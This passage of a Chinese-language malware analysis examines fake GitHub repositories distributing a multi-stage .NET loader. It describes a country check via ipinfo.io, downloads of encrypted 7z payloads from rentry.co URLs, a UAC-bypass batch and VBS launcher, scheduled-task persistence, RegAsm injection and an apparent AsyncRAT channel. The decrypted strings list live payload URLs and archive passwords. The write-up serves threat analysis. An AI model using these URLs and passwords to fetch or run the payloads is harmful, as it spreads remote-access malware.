initial; vertical-align: middle; width: auto;" width="956" /><span></span></p><p><br /></p><p>其中，Releases中也包含相关的恶意软件，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a58945f0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1PZAibWs4vv2phX3PibWIiawZ3augMHPibwQhOHqZnmiaibRyBPGw1HP7FzlA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1016" /></p><p><br /></p><p>此外，这些仓库都包含一个名为Star的workflows，Github actions执行后会修改LOG文件中的最后更新时间，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=20ff26cc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl11SgUljHF67Y2xu8wrHTtW8EickIAGUpodSM2ugiagGEGf5fZa1iaAhzcg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="957" /></p><p><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=51ea7405&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1D5JjLachqA46cTKg4704S41czicYlQ81wOtXriam5VEreDCwgyGzBOicA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="692" /><span></span><br /><span>（比较有趣的是，黑客填写的本地git邮箱是ischhfd83#rambler.ru）</span><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ccb52d9c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl17w7iaD6PNnlXfacWyV4RNVosStnLFibtovAjV4TyUFk7e50F0L8Ubdnw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="699" /><span></span></p><p><br /></p><p>其README.md均较为逼真，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=63d50fc0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1YTK7DKBicicGQ2JR4peUwjib7TnmXjbFVt4THib7uYBRLNBzm8TBLx9UpQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="662" /></p><p><br /></p><h2>（一）第一层.NET文件</h2><p>将样本使用dnspy反编译后，第一眼映入眼帘的是样本伪装成sln文件有多么“良苦用心”，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=17b200d0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1mqib1f5hCGYm7VG9wtlwtSupgvDt1HzkzeQsEg9CFKuI5yic7ASibrt1A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="687" /></p><p><br /></p><p>随后映入眼帘的便是UHJvZ3JhbUFB下的 "DownloadAll()" "DownloadRU()" "GetCountry()" 等函数名，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=17940d12&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1FFDVTjRHfYzgrRxRq6dVUib9x40qjUHvdw7b0N6myYFom1tyzzuAJFw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="239" /></p><p><br /></p><p>我们还可以看到，其有一个namespace，名为Costura，进入后可以看到其下QXNzZW1ibHlMb2FkZXJB类和QXNzZW1ibHlMb2FkZXJB类之下的静态构造函数.cctor()中有大量调用0xb11a1()模块进行疑似加解密的操作，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=413f22bb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1mE57QdAdQMicN4ZvZyq9icprffmiaXrDBeoGNYGZpcicNDdzR9jCLZe2pA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ea3198fd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1LgibXOF5icTdP5dYiamHxrqpA0hfSBnQm9IKXkleEdSlAPPEw1Y9PlDIg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /><span></span></p><p><br /></p><p>于是我们进入0xb11a1()中查看，可以看到0xb11a1()是一个解密函数，其首先将转化为Base64编码的二进制数据解码得到一个字节数组，随后使用MD5CryptoServiceProvider()计算指定密钥，随后使用TripleDES算法进行解密操作，最后返回的结果为Encoding.UTF8.GetString(bytes)，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=2cb6b96c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1IGK8eYEWicGH6TLVFCRmQxmWSckwQ4POlOvsMYsnPqAzVm5EFSspG8g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /></p><p>我们在第14行返回结果处添加断点，随后调试程序，即可获取bytes数组内每个Hex的内容，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=13d9312e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1Ls3BdH3hx4AbmZDgmiaCPicwoPqXQouJGFyhPgBcniaZ2LOPXSlXQicViag%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=db0bedf7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1ZVcB0xVoq34YBDicuRcXVibE3PEk2UvFcF3j9OAdQmg79RLLd5e0WvmA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /><span></span><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d7a529c1&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1Jfcu0iavPZichM5TBc450C5Ke1ialYnsuTJKj14PC9Bmzh0XvGOHcelLw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /><span></span></p><p><br /></p><p>我们继续调试运行下去，程序产生了以下可疑字符串：<br /></p><p>[Asm] <em style="cursor: pointer; color: rgb(51, 102, 153) !important;">纯文本查看</em> <em style="cursor: pointer; color: rgb(51, 102, 153) !important;">复制代码</em></p><p>?</p><table cellpadding="0" cellspacing="0" height="NaN" style="width: 578px;" width="2074"><tbody style="border-radius: 0px !important; background: none !important; border-width: 0px !important; border-color: initial !important; float: none !important; height: auto !important; line-height: 1.1em !important; overflow: visible !important; vertical-align: baseline !important; width: auto !important;"><tr style="border-width: 0px !important; border-color: initial !important; border-radius: 0px !important; background: none !important; float: none !important; height: auto !important; line-height: 1.1em !important; overflow: visible !important; vertical-align: baseline !important; width: auto !important;"><td height="NaN" style="padding: 0px !important; border-width: 0px !important; border-color: initial !important; border-radius: 0px !important; background: none !important; float: none !important; line-height: 1.1em !important; overflow: visible !important; vertical-align: baseline !important; color: rgb(175, 175, 175) !important;" width="40"><p>01</p><p>02</p><p>03</p><p>04</p><p>05</p><p>06</p><p>07</p><p>08</p><p>09</p><p>10</p><p>11</p></td><td height="NaN" style="padding: 0px !important; border-width: 0px !important; border-color: initial !important; border-radius: 0px !important; background: none !important; float: none !important; line-height: 1.1em !important; overflow: visible !important; vertical-align: baseline !important;" width="NaN"><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"DcoAUBmho367yTRLca4PWGOTDapCDF7i"</code><code style="font-family: Consolas, ;">时，bytes数组内容为</code><code style="font-family: Consolas, ;">"68747470733A2F2F6970696E666F2E696F"</code><code style="font-family: Consolas, ;">，其对应的字符串为</code><code style="font-family: Consolas, ;">"&lt;a href="</code><code style="font-family: Consolas, ;">https://ipinfo.io</code><code style="font-family: Consolas, ;">"&gt;https://ipinfo.io&lt;/a&gt;"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"YarWFP+EY1k="</code><code style="font-family: Consolas, ;">时，bytes数组内容为</code><code style="font-family: Consolas, ;">"636F756E747279"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">"country"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"WQ9RJjRWvr4="</code><code style="font-family: Consolas, ;">时，</code><code style="font-family: Consolas, ;">byte</code><code style="font-family: Consolas, ;">数组内容为</code><code style="font-family: Consolas, ;">"5255"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">"RU"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"DcoAUBmho37SbvQx8t9W89i0JeQvhJ9wMSeXNO2uJoA="</code><code style="font-family: Consolas, ;">时，bytes数组内容为</code><code style="font-family: Consolas, ;">"68747470733A2F2F72656E7472792E636F2F6E396471722F726177"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">"&lt;a href="</code><code style="font-family: Consolas, ;">https://rentry.co/n9dqr/raw</code><code style="font-family: Consolas, ;">"&gt;https://rentry.co/n9dqr/raw&lt;/a&gt;"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"iluO4PO7Pv8="</code><code style="font-family: Consolas, ;">时，bytes数组内容为</code><code style="font-family: Consolas, ;">"2E736C6E"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">".sln"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"OIT6ITVzsw8="</code><code style="font-family: Consolas, ;">时，bytes数组内容为</code><code style="font-family: Consolas, ;">"636D64"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">"cmd"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"NlI2H/2+8sE="</code><code style="font-family: Consolas, ;">时，bytes数组内容为</code><code style="font-family: Consolas, ;">"2F432022"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">'/C "'</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"DcoAUBmho36mBDorlHHmdCf3Z2mGuxd4lraH5pQj6ak="</code><code style="font-family: Consolas, ;">时，bytes数组内容为</code><code style="font-family: Consolas, ;">"68747470733A2F2F7777772E372D7A69702E6F72672F377A722E657865"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">"&lt;a href="</code><code style="font-family: Consolas, ;">https://www.7-zip.</code><code style="font-family: Consolas, ;">org</code><code style="font-family: Consolas, ;">/7zr.exe</code><code style="font-family: Consolas, ;">"&gt;https://www.7-zip.org/7zr.exe&lt;/a&gt;"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"DcoAUBmho37SbvQx8t9W83/Ge3q60WKUmGrtUiDPNuREEna+M2RGUQ=="</code><code style="font-family: Consolas, ;">时，bytes数组内容为</code><code style="font-family: Consolas, ;">"68747470733A2F2F72656E7472792E636F2F4D75636B436F6D70616E794D4D432F726177"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">"&lt;a href="</code><code style="font-family: Consolas, ;">https://rentry.co/MuckCompanyMMC/raw</code><code style="font-family: Consolas, ;">"&gt;https://rentry.co/MuckCompanyMMC/raw&lt;/a&gt;"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"dw3Hoq0iR7Q="</code><code style="font-family: Consolas, ;">，bytes数组内容为</code><code style="font-family: Consolas, ;">"2E377A"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">".7z"</code></p><p><code style="font-family: Consolas, ;">当\u0011 == </code><code style="font-family: Consolas, ;">"kPTQfX8JImAM/GQNAChwT71mgweZc58JQ5/KYY2TfQY="</code><code style="font-family: Consolas, ;">，bytes数组内容为</code><code style="font-family: Consolas, ;">"22202D706852335E26623225413921674B2A364C71503774244E7057"</code><code style="font-family: Consolas, ;">，其对应字符串为</code><code style="font-family: Consolas, ;">'" -phR3^&amp;b2%A9!gK*6LqP7t$NpW'</code></p></td></tr></tbody></table><p><br /></p><p>我们可以看到，以上字符串中，除下载7zr.exe外，访问了2个URL</p><p>我们手动访问第一个URL，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=8e3a8005&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1cicukiccIL5CTftucGoSC1qAOiafs9UiaTr4EXDTwCQT5zhcnrphUXHV3A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="746" /></p><p><br /></p><p>这是一个下载地址，下载该文件后我们发现这是一个真实的sln白文件，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=1f9a6f68&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1eTm31InwiayWpuIONI6KOF5ics1Vs0Od3gKzK4wlHO3Zoia1pGM2gcsJw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="754" /></p><p><br /></p><p>我们手动访问第二个URL，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=142fadcc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1kpbaqJB1vX4B4yJ1hlnfYVxMlT5gBQzqAUl7hXYBn15TD7lMxuLT1Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="771" /></p><p><br /></p><p>这是一个下载地址，下载该文件后我们发现这是一个加密的7-Zip压缩包(VisualStudioEN.7z)，里面有一个PE可执行文件VisualStudio.exe，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=91f7f335&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1tvWTsCO1DIZpwhJWicJKEkS57ZIh2kmy31IexkF4s4sy1RjhnlVmUfw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="785" /></p><p><br /></p><p>结合以上字符串，我们可以判断，该程序的主要目的是下载7-Zip组件解压加密压缩包VisualStudioEN.7z(解压密码为"hR3^&amp;b2%A9!gK*6LqP7t$NpW")</p><p>通过以上字符串，基本上可以判断该程序的行为：<br />第一步，访问ipinfo.io，判断国家<br />第二步，下载一个真实的sln白文件，然后通过cmd来打开它<br />第三步，下载内含第二阶段恶意载荷的加密压缩包VisualStudioEN.7z，通过下载的7-Zip组件来解压加密压缩包VisualStudioEN.7z(解压密码为"hR3^&amp;b2%A9!gK*6LqP7t$NpW")</p><h2>（二）第二层.NET文件</h2><p>通过加密压缩包VisualStudioEN.7z解压得到的第二阶段恶意载荷VisualStudio.exe仍然使用.NET编写，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=41849c4e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1oL8vYYk8NwMzJFKIWLDajHflqCbTOne148fHg1m17QdrXf4MPfJHFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="722" /></p><p><br /></p><p>第二层.NET文件引用的Costura namespace与第一层.NET文件结构非常相似，但是上方程序主函数不同，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=0b1ca1a4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1w0libJHnX27ibj8RNicJ0LZlqjic6HHrib9rSRzJ2nBrlXwxgnWdddRZibSw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="251" /></p><p><br /></p><h3>一、Service.exe模块</h3><p>其首先创建一个"C:\Users\Public\Videos\b.bat"文件，用于绕过UAC并执行稍后将要释放的恶意Payload "C:\Users\Public\Videos\Service.exe"；然后创建一个"C:\Users\Public\Videos\b.vbs"文件，用于启动刚才创建的b.bat文件，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=90e053a0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1Oib07icD18Kr4AGhmm1qJJOXxreL51Z43Y2tUmsupTzGl4lJSwYfmqdA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /></p><p>随后，base64解密出Service.exe，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ddf5ffa8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl14Bz7MaXDCuiaGsnxvfL9NVHwP0qVkH78LCInO8UBibYWh2jw4qQ28osQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=9553864b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1OdHRPjhAyggY4AMYaJMFBPzCNoWEriclicia9fs9YXPvT6skbYOvZq3icw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /><span></span></p><p><br /></p><p>之后无窗口静默启动刚才上面释放的b.vbs，（然后b.vbs会启动b.bat，b.bat会尝试绕过系统UAC并启动Payload Service.exe），如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=53fabf43&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl17ibVsz4YCw4yM1jjP9RmtoIK2csyb2tQko7rwH5W7vtLP1Yr8LUVFsA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="693" /></p><p><br /></p><p>Service.exe的作用是为稍后将要释放的"C:\ProgramData\MicrosoftTool\current\Microsoft.exe"文件通过命令行添加计划任务，其会在%temp%下释放一个临时的v2.bat，待添加完成后会对v2.bat进行删除。</p><p>行为如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=c9d99149&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1wiaGA6W4lj6W1Vriaj6iaKSSUbzrshl7T1deXnh6PB1ByZYVTjxtgKk5g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="998" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=98a3d592&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1h76Bicpa3Q1fZ8L6tTFF3pWOtgzn5yTDAia70UB2E4QzTcREXULgExxg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="728" /><span></span></p><p><br /></p><p>行为链如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=c7cd1a75&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1FEEYuWZ6m87r1CYICwwJ6MSXzdtRJvM4XxricicZSaZN1BADtyFLFWTA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a98b932d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl15TxsOVqWRTzhDBc1RqLUeN9SeeQVFLE9KRlC1YVTzbJ3oRYOtibZ1Tw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /><span></span><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=f449b151&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1LJcGh4tDJ7m4vmNySkJccGaORiaPn7RMBf7rbGicZjIrnfqxYYibtJEKA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /><span></span></p><p><br /></p><p>删除临时的v2.bat，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=cd93e03d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl15cvuB3yFvasLcajp5dNtxjQY2KQFsZaJs7e89ZHWleI2f0DbqAftlQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /></p><p>添加的计划任务，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=43f9cfc6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl15qKQXf02kGdv8pCEv3icOtC7qwx77a0TfMNHEtzmuYn5YnpqC7EPZdA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="986" /></p><p><br /></p><h3>二、BitDefender.7z</h3><p>随后，其下载7-Zip组件（至ProgramData下）与https://rentry.co/MuckMKV/raw下的加密压缩包进行解压（解压密码为"SaToshi780189.!"），如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=5738d96b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1gAgLNEnFSriaSoicic7284fbpQL3njGzzXVGz4dic202wQbqKJNDCZ09ew%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=c85bcbde&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1iceIEBvkuJ7ZO5JuG2HX4MbAaHf7befdcW7LIoF9ZjRictsCZLEXcWEA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /><span></span></p><p><br /></p><p>我们手动访问URL，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a4612aee&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1uFeXxnXWW0rb0Oy7DYyGzRbQmicfD5C7zFF9bSZBDjD7llbccib2Demg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="713" /></p><p><br /></p><p>下载之后得到BitDefender.7z，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=f7663b82&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1MKTUZYGeVqafwWaj6WePLHk2tUocMqECdWG0Vt8OmmqibHKqmztEVSg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="621" /></p><p><br /></p><p>将其解压后可得到4个PE可执行文件，如下图所示：<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=28a720f9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1QshKlGOE0hD7pAcWcyhl5Zpic72YYUiaZqqdUKiaxvIomMb2CxZ8XTQHg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="789" /></p><p><br /></p><p>其中，使用.NET编写的文件均使用了Cronos-Crypter代码混淆器，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=64a7e1de&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1ORkDVAVkluEGXdmMKM0wseBN34wIhJGfgbTwNia5BRRZynQuwBKAN8w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /></p><p>其会注入RegAsm.exe，然后进程自退出，如下图所示：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=cc76907d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1KtpwqDw4xzDQFWWBHHHt7WKEtSCicubvzrbnkt1N4EvuKaWpibB3icB6A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1024" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ae3c64b6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIRpYmsS1LXTibPRz1cbzLl1fsbkvnB5pxxnx18Xz8PhFibgbE1nXDibxPnJGPic4K8BLiaPQBjP4ljbgw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="914" /><span></span></p><p><br /></p><p>通信协议疑似为AsyncRAT，如下图所示：<br /><img border="0" 